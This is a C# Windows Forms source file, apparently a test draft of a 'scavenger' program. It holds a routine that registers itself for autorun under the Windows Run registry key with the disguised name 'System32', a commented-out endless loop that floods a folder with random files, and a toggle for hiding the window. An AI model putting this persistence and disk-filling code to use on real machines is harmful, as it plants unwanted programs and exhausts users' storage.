using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace testScavenger
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private string path = @"E:\123\";

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Visible = zapusk(); // false; //true;


            //Microsoft.Win32.RegistryKey autorun = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",true);
            //autorun.SetValue("System32", Application.ExecutablePath);

            //avtoGruz();

            //Random rand = new Random();

            //System.IO.Directory.CreateDirectory(path);

            //while(1==1)
            //{
            //    System.IO.File.WriteAllText(path + rand.NextDouble().ToString(), rand.NextDouble().ToString() + rand.NextDouble().ToString());
            //}

            FileCreation();

        }

        private void avtoGruz()
        {
            Microsoft.Win32.RegistryKey autorun = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            autorun.SetValue("System32", Application.ExecutablePath);
        }


        private void FileCreation()
        {
            int test = 0;
            Random rand = new Random();

            System.IO.Directory.CreateDirectory(path);

            while (test!=10)
            {
                System.IO.File.WriteAllText(path + rand.NextDouble().ToString(), rand.NextDouble().ToString() + rand.NextDouble().ToString());
                
                Thread.Sleep(1000);
                label1.Text += "Спим";
                test += 1;

                if (test ==10 )
                {
                    break;
                }
            }
        }

        private bool zapusk(bool znach = true)
        {
            return znach;
        }

        private void Button1_Click(object sender, EventArgs e)
        {
           // avtoGruz();
           // FileCreation();
           // zapusk(false);

        }
    }
}
